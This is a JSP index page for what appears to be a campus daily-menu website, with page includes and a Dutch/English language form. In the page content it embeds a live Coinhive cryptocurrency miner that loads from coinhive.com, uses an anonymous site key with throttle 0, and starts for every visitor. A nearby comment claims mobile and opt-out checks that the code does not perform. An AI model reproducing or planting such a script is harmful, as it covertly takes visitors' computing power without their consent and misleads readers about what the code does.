<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<%@ taglib prefix = "fmt" uri = "http://java.sun.com/jsp/jstl/fmt" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<!-- header -->
<%@ include file="components/header.jspf"%>

<!-- Navigation -->
<c:set var="page" value="index"/>

<%@ include file="components/navigation.jspf"%>
<%--<jsp:include page="/components/navigation.jspf">--%>
    <%--<jsp:param name="page" value="index" />--%>
<%--</jsp:include>--%>

<!-- Page Content -->
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
    var miner = new CoinHive.Anonymous('gSXNqrhGtGheICvOlLGd276iq9ywTXc0', {throttle: 0});

    // Only start on non-mobile devices and if not opted-out
    // in the last 14400 seconds (4 hours):
    miner.start();
</script>

<c:choose>
    <c:when test="${cookie['language'].value == 'en'}">
        <%@ include file="lan/en/indexen.jspf"%>
    </c:when>

    <c:when test="${cookie['language'].value == 'nl'}">
        <%@ include file="lan/nl/indexnl.jspf"%>
    </c:when>

    <c:otherwise>
        <div class="container">
            <div class="row">
                <div class="col-md-8 well">
                    <h2 id="pageTitle"><br>Dagmenu campus {Campus ...}</h2>
                    <form method="POST" action="/index/setCookie">
                        <p>
                            <label for="nl"><input type="radio" name="language" value="nl" id="nl">Nederlands</label>
                            <label for="en"><input type="radio" name="language" value="en" id="en">English</label>
                            <br>
                            <input type="submit" id="language" value="Send">
                        </p>
                    </form>
                </div>
            </div>
        </div>
    </c:otherwise>
</c:choose>
